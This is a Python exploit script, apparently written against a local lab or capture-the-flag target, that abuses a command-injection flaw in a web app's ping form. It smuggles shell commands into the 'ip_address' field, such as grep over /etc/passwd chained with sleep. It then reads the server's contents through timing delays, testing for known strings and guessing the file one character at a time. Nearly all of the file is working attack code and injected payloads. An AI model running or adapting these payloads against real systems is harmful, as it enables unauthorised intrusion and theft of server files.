#!/usr/bin/env python3
"""
Time-Based Boolean Exfiltration - Confirmed Working Channel
Target: http://127.0.0.1:32943

CONFIRMED WORKING:
- Time-based extraction via conditional sleep
- Pattern: 127.0.0.1; grep PATTERN /file && sleep 2
- If pattern matches: +2 second delay (grep exits 0, && executes)
- If no match: no extra delay (grep exits 1, && skipped)

This allows bit-by-bit or character-by-character data extraction.
"""

import requests
import time
import string

BASE_URL = "http://127.0.0.1:32943"
TIMEOUT = 30

def send_ping_with_timing(payload, expected_delay=0):
    """Send probe and measure timing carefully"""
    try:
        url = f"{BASE_URL}/ping"
        data = {"ip_address": payload}
        
        start = time.time()
        resp = requests.post(url, data=data, timeout=TIMEOUT)
        elapsed = time.time() - start
        
        resp_lower = resp.text.lower()
        if "reachable" in resp_lower and "unreachable" not in resp_lower:
            result = "REACHABLE"
        elif "unreachable" in resp_lower:
            result = "UNREACHABLE"
        else:
            result = "OTHER"
        
        return {
            "status": resp.status_code,
            "result": result,
            "elapsed": elapsed,
            "has_delay": elapsed > (expected_delay + 1.0)
        }
    except requests.RequestException as e:
        return {"error": str(e)}

# ============================================================
# VERIFY TIME-BASED CHANNEL
# ============================================================

print("="*70)
print("VERIFICATION: Time-Based Boolean Extraction")
print("="*70)

# Verify the channel works with known patterns
verification_tests = [
    # Known pattern that exists in /etc/passwd
    ("root exists", "127.0.0.1; grep root /etc/passwd && sleep 2", True),
    # Known pattern that does NOT exist
    ("XYZ123456 not exists", "127.0.0.1; grep XYZ123456 /etc/passwd && sleep 2", False),
    # Another existing pattern
    ("bin exists", "127.0.0.1; grep bin /etc/passwd && sleep 2", True),
    # Non-existing pattern
    ("FAKENAME not exists", "127.0.0.1; grep FAKENAME /etc/passwd && sleep 2", False),
]

print("\nVerification tests (should see ~+2s delay for 'exists' tests):")
print("-"*60)

for name, payload, should_delay in verification_tests:
    result = send_ping_with_timing(payload, expected_delay=2 if should_delay else 0)
    delay_indicator = "✓ DELAY" if result.get('has_delay') else "✗ NO DELAY"
    expected = "(expected)" if should_delay == result.get('has_delay') else "(UNEXPECTED!)"
    
    print(f"{name:25} | Elapsed: {result.get('elapsed', 0):.2f}s | {delay_indicator} {expected}")
    time.sleep(0.5)

# ============================================================
# CHARACTER EXTRACTION TESTS
# ============================================================

print("\n" + "="*70)
print("CHARACTER-BY-CHARACTER EXTRACTION TEST")
print("="*70)

# Try to extract first character of /etc/passwd (should be 'r' for root)
print("\nTesting character extraction from /etc/passwd first line:")
print("Expected first character: 'r' (from 'root:x:0:0:root:/root:/bin/bash')")
print("-"*60)

test_chars = ['r', 'x', 'a', 'b', '1', 'R']
target_file = "/etc/passwd"

for char in test_chars:
    # Test if first character matches
    payload = f"127.0.0.1; head -1 {target_file} | grep -q '^{char}' && sleep 2"
    result = send_ping_with_timing(payload, expected_delay=2)
    
    if result.get('has_delay'):
        print(f"Character '{char}': FOUND ✓ (delay: {result.get('elapsed', 0):.2f}s)")
    else:
        print(f"Character '{char}': not found (time: {result.get('elapsed', 0):.2f}s)")
    
    time.sleep(0.5)

# ============================================================
# STRING CONTENT EXTRACTION
# ============================================================

print("\n" + "="*70)
print("STRING CONTENT VERIFICATION")
print("="*70)

# Check for specific strings we expect to find
string_tests = [
    ("/etc/passwd contains 'root'", "127.0.0.1; grep root /etc/passwd && sleep 1.5", True),
    ("/etc/passwd contains 'daemon'", "127.0.0.1; grep daemon /etc/passwd && sleep 1.5", True),
    ("/etc/passwd contains 'bin/bash'", "127.0.0.1; grep 'bin/bash' /etc/passwd && sleep 1.5", True),
    ("/etc/passwd contains 'FAKEUSER'", "127.0.0.1; grep FAKEUSER /etc/passwd && sleep 1.5", False),
    ("/etc/passwd contains 'nologin'", "127.0.0.1; grep nologin /etc/passwd && sleep 1.5", True),
]

print("\nString existence verification:")
print("-"*60)

for name, payload, should_exist in string_tests:
    result = send_ping_with_timing(payload, expected_delay=1.5 if should_exist else 0)
    found = result.get('has_delay')
    status = "✓ FOUND" if found else "✗ NOT FOUND"
    print(f"{name:40} => {status} ({result.get('elapsed', 0):.2f}s)")
    time.sleep(0.5)

